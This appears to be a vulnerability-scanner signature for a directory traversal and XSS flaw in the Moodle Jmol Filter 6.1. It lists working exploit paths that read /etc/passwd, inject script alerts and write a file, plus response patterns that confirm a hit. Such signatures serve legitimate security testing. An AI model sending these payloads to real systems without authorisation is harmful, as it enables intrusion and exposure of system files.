# info to search signature
id: Mod-jmol-lfi-01
type: fuzz
level: 1
info:
  name: Moodle Jmol Filter 6.1 - Directory Traversal
  risk: High

payloads:
    - '/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd'
    - '/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html'
    - '/filter/jmol/iframe.php?_USE=%22};alert(%27XSS%27);//'
    - '/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&encoding=base64&data=UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA%3D%3D&filename=empty.zip'
    
requests:
  - generators:
      - Path("{{.payload}}", "*")
    detections:
      - >-
        StatusCode() == 200 && StringSearch("response", "root:") && StringSearch("response", "/bin/bash") || StringSearch("response", "<script>alert('XSS')</script>") || StringSearch("response", "%22};alert(%27XSS%27);//") || StringSearch("response", "PK")
